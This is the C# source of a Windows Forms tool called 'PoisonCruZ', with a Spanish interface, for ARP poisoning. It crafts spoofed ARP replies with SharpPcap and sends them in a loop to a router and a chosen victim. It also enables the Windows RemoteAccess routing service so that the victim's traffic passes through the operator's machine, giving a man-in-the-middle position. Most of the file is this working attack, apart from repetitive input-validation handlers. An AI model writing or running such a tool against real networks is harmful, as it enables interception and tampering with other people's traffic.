using System;
using System.Windows.Forms;
using SharpPcap;
using PacketDotNet;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Management;
using System.ServiceProcess;

namespace PoisonCruZ
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public static void SendARPresponse(ICaptureDevice device, IPAddress srcIP, IPAddress dstIP, PhysicalAddress srcMac, PhysicalAddress dstMac)
        {
            ARPPacket arp = new ARPPacket(ARPOperation.Response, dstMac, dstIP, srcMac, srcIP);
            EthernetPacket eth = new EthernetPacket(srcMac, dstMac, EthernetPacketType.Arp);
            arp.PayloadData = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            eth.PayloadPacket = arp;
            device.SendPacket(eth);
        }
        bool breake = false;
        private void button1_Click(object sender, EventArgs e)
        {
            if (button1.Text == "Envenenar ARP")
            {
                label8.Text = "Status: Verificando Datos";
                if ((tmr.Text.Length != 12 || tmv.Text.Length != 12|| ttmac.Text.Length != 12) || (tmr.Text == "ABCDEF123456" || tmv.Text == "ABCDEF123456" || ttmac.Text == "ABCDEF123456"))
                {
                    label8.Text = "Status: Datos Incorrectos";
                    MessageBox.Show("Alguna MAC esta incorrecta!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (comboBox1.SelectedIndex ==-1)
                {
                    label8.Text = "Status: Datos Incorrectos";
                    MessageBox.Show("Selecciona la tarjeta de RED.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                
                if (textBox1.Text.Length <=0)
                {
                    label8.Text = "Status: Datos Incorrectos";
                    MessageBox.Show("Tiempo entre paquete y paquete incorrecto.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                int mss=0;
                try
                {
                    mss = Convert.ToInt32(textBox1.Text);
                }
                catch
                {
                    label8.Text = "Status: Datos Incorrectos";
                    MessageBox.Show("Tiempo entre paquete y paquete incorrecto.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (mss <= 0 || mss > 10000)
                {
                    label8.Text = "Status: Datos Incorrectos";
                    MessageBox.Show("Tiempo entre paquete y paquete muy alto o muy bajo.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                label8.Text = "Status: Cogiendo Tarjeta de RED";
                CaptureDeviceList devices = CaptureDeviceList.Instance;
                ICaptureDevice device = devices[comboBox1.SelectedIndex];
                device.Open(DeviceMode.Normal, 1000);
                breake = true;
                string t1 = tir.Text;
                string t2 = tiv.Text;
                string t3 = tti.Text;
                string t4 = ttmac.Text.ToUpper();
                string t5 = tmr.Text.ToUpper();
                string t6 = tmv.Text.ToUpper();
                label8.Text = "Status: Envenenando ARP cada " + textBox1.Text+"ms";
                Thread arpenv = new Thread(() =>
                {
                    while (breake)
                    {
                        SendARPresponse(device, IPAddress.Parse(t1), IPAddress.Parse(t2), PhysicalAddress.Parse(t4), PhysicalAddress.Parse(t6));
                        SendARPresponse(device, IPAddress.Parse(t2), IPAddress.Parse(t1), PhysicalAddress.Parse(t4), PhysicalAddress.Parse(t5));
                        SendARPresponse(device, IPAddress.Parse(t1), IPAddress.Parse(t3), PhysicalAddress.Parse(t5), PhysicalAddress.Parse(t4));//FIX MAC INTERNA DEL ROUTER
                        SendARPresponse(device, IPAddress.Parse(t2), IPAddress.Parse(t3), PhysicalAddress.Parse(t6), PhysicalAddress.Parse(t4));//FIX MAC INTERNA DE LA VICTIMA
                        Thread.Sleep(mss);
                    }
                    Thread.CurrentThread.Abort();
                });
                arpenv.IsBackground = true;
                arpenv.Start();
                button2.Enabled = false;
                button1.Text = "Parar";
            }
            else if (button1.Text == "Parar")
            {
                label8.Text = "Status: Parando Envenenamiento ARP";
                breake = false;
                button1.Text = "Envenenar ARP";
                button2.Enabled = true;
                label8.Text = "Status: Envenenamiento ARP Parado";
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ServiceController service = new ServiceController("RemoteAccess");
            if (service.ServiceName == "RemoteAccess")
            {
                if (service.Status.ToString() != "Running")
                {
                    button2.Text = "Enrutamiento: OFF";
                }
                else
                {
                    button2.Text = "Enrutamiento: ON";
                }
            }
            
            CaptureDeviceList devices = CaptureDeviceList.Instance;
            foreach (ICaptureDevice objeto in devices)
            {
                comboBox1.Items.Add(objeto.Description);
            }
        }

        private void tmr_KeyPress(object sender, KeyPressEventArgs e)
        {
            char c = e.KeyChar;
            if ((c >= 'G' && c <= 'Z') || (c >= 'g' && c <= 'z') || c == '.' || c == ' ' || c == 'Ç' || c == 'º' || c == 'ª' || c == '\\' || c == '!' || c == '|' || c == '"' || c == '@' || c == '·' || c == '#' || c == '$' || c == '~' || c == '%' || c == '€' || c == '&' || c == '¬' || c == '}' || c == '/' || c == '(' || c == ')' || c == '=' || c == '?' || c == '¿' || c == 'ç' || c == '`' || c == '+' || c == '^' || c == '*' || c == '[' || c == ']' || c == '¨' || c == '´' || c == '{' || c == ';' || c == ':' || c == '_' || c == ',' || c == '.' || c == '-' || c == '<' || c == '>' || c == 'ñ' || c == 'Ñ')
            {
                e.Handled = true;
            }
        }

        private void tmv_KeyPress(object sender, KeyPressEventArgs e)
        {
            char c = e.KeyChar;
            if ((c >= 'G' && c <= 'Z') || (c >= 'g' && c <= 'z') || c == '.' || c == ' ' || c == 'Ç' || c == 'º' || c == 'ª' || c == '\\'|| c == '!' || c == '|' || c == '"' || c == '@' || c == '·' || c == '#' || c == '$' || c == '~' || c == '%' || c == '€' || c == '&' || c == '¬' || c == '}' || c == '/' || c == '(' || c == ')' || c == '=' || c == '?' || c == '¿' || c == 'ç' || c == '`' || c == '+' || c == '^' || c == '*' || c == '[' || c == ']' || c == '¨' || c == '´' || c == '{' || c == ';' || c == ':' || c == '_' || c == ',' || c == '.' || c == '-' || c == '<' || c == '>' || c == 'ñ' || c == 'Ñ')
            {
                e.Handled = true;
            }
        }

        private void ttmac_KeyPress(object sender, KeyPressEventArgs e)
        {
            char c = e.KeyChar;
            if ((c >= 'G' && c <= 'Z') || (c >= 'g' && c <= 'z') || c == '.' || c == ' ' || c == 'Ç' || c == 'º' || c == 'ª' || c == '\\' || c == '!' || c == '|' || c == '"' || c == '@' || c == '·' || c == '#' || c == '$' || c == '~' || c == '%' || c == '€' || c == '&' || c == '¬' || c == '}' || c == '/' || c == '(' || c == ')' || c == '=' || c == '?' || c == '¿' || c == 'ç' || c == '`' || c == '+' || c == '^' || c == '*' || c == '[' || c == ']' || c == '¨' || c == '´' || c == '{' || c == ';' || c == ':' || c == '_' || c == ',' || c == '.' || c == '-' || c == '<' || c == '>' || c == 'ñ' || c == 'Ñ')
            {
                e.Handled = true;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = -1;
            comboBox1.Text = "";
            comboBox1.Items.Clear();
            CaptureDeviceList devices = CaptureDeviceList.Instance;
            foreach (ICaptureDevice objeto in devices)
            {
                comboBox1.Items.Add(objeto.Description);
            }
        }

        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            char c = e.KeyChar;
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == '.' || c == ' ' || c == 'Ç' || c == 'º' || c == 'ª' || c == '\\' || c == '!' || c == '|' || c == '"' || c == '@' || c == '·' || c == '#' || c == '$' || c == '~' || c == '%' || c == '€' || c == '&' || c == '¬' || c == '}' || c == '/' || c == '(' || c == ')' || c == '=' || c == '?' || c == '¿' || c == 'ç' || c == '`' || c == '+' || c == '^' || c == '*' || c == '[' || c == ']' || c == '¨' || c == '´' || c == '{' || c == ';' || c == ':' || c == '_' || c == ',' || c == '.' || c == '-' || c == '<' || c == '>' || c == 'ñ' || c == 'Ñ')
            {
                e.Handled = true;
            }
        }
        public void StartService(string serviceName)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running,
                                                    new TimeSpan(0, 0, 0, 20));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        public void StopService(string serviceName)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                service.Stop();
                service.WaitForStatus(ServiceControllerStatus.Stopped,
                                                    new TimeSpan(0, 0, 0, 20));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        public static void EnableTheService(string serviceName)
        {
            using (var mo = new ManagementObject(string.Format("Win32_Service.Name=\"{0}\"", serviceName)))
            {
                mo.InvokeMethod("ChangeStartMode", new object[] { "Automatic" });
            }
        }
        public static void DisableTheService(string serviceName)
        {
            using (var mo = new ManagementObject(string.Format("Win32_Service.Name=\"{0}\"", serviceName)))
            {
                mo.InvokeMethod("ChangeStartMode", new object[] { "Disabled" });
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            if (button2.Text == "Enrutamiento: OFF")
            {
                label8.Text = "Status: Habilitando Enrutamiento";
                EnableTheService("RemoteAccess");
                label8.Text = "Status: Iniciando Enrutamiento";
                StartService("RemoteAccess");
                label8.Text = "Status: Enrutamiento Iniciado";
                button2.Text = "Enrutamiento: ON";
            }
            else if (button2.Text == "Enrutamiento: ON")
            {
                label8.Text = "Status: Parando Enrutamiento";
                StopService("RemoteAccess");
                label8.Text = "Status: Deshabilitando Enrutamiento";
                DisableTheService("RemoteAccess");
                label8.Text = "Status: Enrutamiento Deshabilitado";
                button2.Text = "Enrutamiento: OFF";
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            ServiceController service = new ServiceController("RemoteAccess");
            if (service.ServiceName == "RemoteAccess")
            {
                if (service.Status.ToString() != "Running")
                {
                    button2.Text = "Enrutamiento: OFF";
                    button1.Enabled = false;
                }
                else
                {
                    button2.Text = "Enrutamiento: ON";
                    button1.Enabled = true;
                }
            }

        }

        private void tir_KeyPress(object sender, KeyPressEventArgs e)
        {
            char c = e.KeyChar;
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == 'Ç' || c == ' ' || c == 'º' || c == 'ª' || c == '\\' || c == '!' || c == '|' || c == '"' || c == '@' || c == '·' || c == '#' || c == '$' || c == '~' || c == '%' || c == '€' || c == '&' || c == '¬' || c == '}' || c == '/' || c == '(' || c == ')' || c == '=' || c == '?' || c == '¿' || c == 'ç' || c == '`' || c == '+' || c == '^' || c == '*' || c == '[' || c == ']' || c == '¨' || c == '´' || c == '{' || c == ';' || c == ':' || c == '_' || c == ',' || c == '-' || c == '<' || c == '>' || c == 'ñ' || c == 'Ñ')
            {
                e.Handled = true;
            }
        }

        private void tiv_KeyPress(object sender, KeyPressEventArgs e)
        {
            char c = e.KeyChar;
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == 'Ç' || c == ' ' || c == 'º' || c == 'ª' || c == '\\' || c == '!' || c == '|' || c == '"' || c == '@' || c == '·' || c == '#' || c == '$' || c == '~' || c == '%' || c == '€' || c == '&' || c == '¬' || c == '}' || c == '/' || c == '(' || c == ')' || c == '=' || c == '?' || c == '¿' || c == 'ç' || c == '`' || c == '+' || c == '^' || c == '*' || c == '[' || c == ']' || c == '¨' || c == '´' || c == '{' || c == ';' || c == ':' || c == '_' || c == ',' || c == '-' || c == '<' || c == '>' || c == 'ñ' || c == 'Ñ')
            {
                e.Handled = true;
            }
        }

        private void tti_KeyPress(object sender, KeyPressEventArgs e)
        {
            char c = e.KeyChar;
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == 'Ç' || c == ' ' || c == 'º' || c == 'ª' || c == '\\' || c == '!' || c == '|' || c == '"' || c == '@' || c == '·' || c == '#' || c == '$' || c == '~' || c == '%' || c == '€' || c == '&' || c == '¬' || c == '}' || c == '/' || c == '(' || c == ')' || c == '=' || c == '?' || c == '¿' || c == 'ç' || c == '`' || c == '+' || c == '^' || c == '*' || c == '[' || c == ']' || c == '¨' || c == '´' || c == '{' || c == ';' || c == ':' || c == '_' || c == ',' || c == '-' || c == '<' || c == '>' || c == 'ñ' || c == 'Ñ')
            {
                e.Handled = true;
            }
        }
    }
}
